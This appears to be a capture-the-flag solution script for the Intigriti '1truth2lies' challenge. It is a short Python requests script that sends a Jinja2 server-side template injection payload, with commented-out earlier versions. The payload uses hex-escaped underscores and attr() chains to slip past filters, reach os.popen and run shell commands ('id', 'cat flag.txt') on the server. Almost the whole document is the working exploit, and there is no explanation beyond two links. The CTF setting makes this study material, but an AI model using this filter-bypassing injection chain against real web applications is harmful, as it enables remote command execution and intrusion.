![image](https://user-images.githubusercontent.com/19681324/158212972-d61fdbd6-6e10-486e-abe6-6f7ed4179405.png)

https://hackmd.io/@Chivato/HyWsJ31dI





```
import requests

requests.packages.urllib3.disable_warnings() 


proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}


url = "https://1truth2lies.ctf.intigriti.io/"

path = """/
 ▄█    ▄▄▄▄███▄▄▄▄         ▄█    █▄  ███    █▄   ▄█       ███▄▄▄▄      ▄████████    ▄████████    ▄████████ ▀█████████▄   ▄█          ▄████████ 
███  ▄██▀▀▀███▀▀▀██▄      ███    ███ ███    ███ ███       ███▀▀▀██▄   ███    ███   ███    ███   ███    ███   ███    ███ ███         ███    ███ 
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███   ███    █▀    ███    ███   ███    ███   ███    ███ ███         ███    █▀  
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀   ███    ███  ▄███▄▄▄██▀  ███        ▄███▄▄▄     
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███▀▀▀██▄  ███       ▀▀███▀▀▀     
███  ███   ███   ███      ███    ███ ███    ███ ███       ███   ███   ███    █▄  ▀███████████   ███    ███   ███    ██▄ ███         ███    █▄  
███  ███   ███   ███      ███    ███ ███    ███ ███▌    ▄ ███   ███   ███    ███   ███    ███   ███    ███   ███    ███ ███▌    ▄   ███    ███ 
█▀    ▀█   ███   █▀        ▀██████▀  ████████▀  █████▄▄██  ▀█   █▀    ██████████   ███    ███   ███    █▀  ▄█████████▀  █████▄▄██   ██████████ 
                                                ▀                                  ███    ███                           ▀"""
                                                


#payload = "{{'7' * 7}}"
#payload = "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"

cmd = 'cat flag\x5c\x78\x32\x65txt'
payload = "{{request|attr('application')|attr('\x5c\x78\x35\x66\x5c\x78\x35\x66globals\x5c\x78\x35\x66\x5c\x78\x35\x66')|attr('\x5c\x78\x35\x66\x5c\x78\x35\x66getitem\x5c\x78\x35\x66\x5c\x78\x35\x66')('\x5c\x78\x35\x66\x5c\x78\x35\x66builtins\x5c\x78\x35\x66\x5c\x78\x35\x66')|attr('\x5c\x78\x35\x66\x5c\x78\x35\x66getitem\x5c\x78\x35\x66\x5c\x78\x35\x66')('\x5c\x78\x35\x66\x5c\x78\x35\x66import\x5c\x78\x35\x66\x5c\x78\x35\x66')('os')|attr('popen')('"+cmd+"')|attr('read')()}}"

res = requests.get(url=url+'/'+path+'?input='+payload, proxies=proxies ,  verify = False)

print(res.text)

```
